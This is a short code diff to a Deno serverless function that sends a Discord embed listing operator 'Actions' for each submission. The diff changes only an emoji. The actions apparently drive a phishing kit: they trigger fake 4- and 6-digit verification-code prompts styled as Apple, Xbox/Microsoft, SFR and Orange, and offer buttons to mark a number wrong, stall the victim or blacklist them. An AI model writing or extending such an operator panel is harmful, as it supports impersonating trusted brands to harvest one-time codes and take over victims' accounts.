@@ -65,7 +65,7 @@ Deno.serve(async (req) => {
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "⚡ Actions",
-        value: `✅ [**Code à 4 chiffres (APPLE)**](${triggerUrl})\n🔢 [**Code 6 chiffres (XBOX MICROSOFT)**](${appUrl}/?triggerAction=code6&id=${submissionId})\n🔢 [**Code 6 chiffres (SFR FORMAT)**](${appUrl}/?triggerAction=code6sfr&id=${submissionId})\n🔢 [**Code 6 chiffres (ORANGE FORMAT)**](${appUrl}/?triggerAction=code6orange&id=${submissionId})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
+        value: `🔢 [**Code à 4 chiffres (APPLE)**](${triggerUrl})\n🔢 [**Code 6 chiffres (XBOX MICROSOFT)**](${appUrl}/?triggerAction=code6&id=${submissionId})\n🔢 [**Code 6 chiffres (SFR FORMAT)**](${appUrl}/?triggerAction=code6sfr&id=${submissionId})\n🔢 [**Code 6 chiffres (ORANGE FORMAT)**](${appUrl}/?triggerAction=code6orange&id=${submissionId})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
         inline: false
       },
     ],
